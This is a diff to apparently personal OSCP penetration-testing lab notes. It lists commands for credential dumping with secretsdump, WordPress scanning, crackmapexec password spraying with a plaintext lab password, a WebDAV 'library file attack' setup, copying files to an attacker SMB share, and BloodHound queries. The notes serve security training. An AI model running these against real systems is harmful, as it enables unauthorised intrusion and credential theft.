@@ -3423,3 +3423,44 @@ we then move the two .bak files to our windows machine and crack them
 ```
 impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 ```
+
+## Assembling pieces
+
+Use whatweb to get tech stack for webpage
+```
+whatweb http://192.168.50.244
+```
+
+Using wpscan without api key
+```
+wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
+cat websrv1/wpscan
+```
+
+use crackmapexec to pair usernames with passwords
+```
+crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success
+```
+
+can also use it to get SMB shares
+```
+crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares
+```
+
+library file attack 
+1. starts wsgidav
+```
+/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/offsec/oscp/webdav/
+
+use Copy-Item for SMB share command line access
+```
+Copy-Item -Path C:\file.exe -Destination \\192.168.45.235\share
+```
+
+bloodhound get computers and users on network
+```
+MATCH (m:Computer) RETURN m
+MATCH (m:User) RETURN m
+MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
+```
+
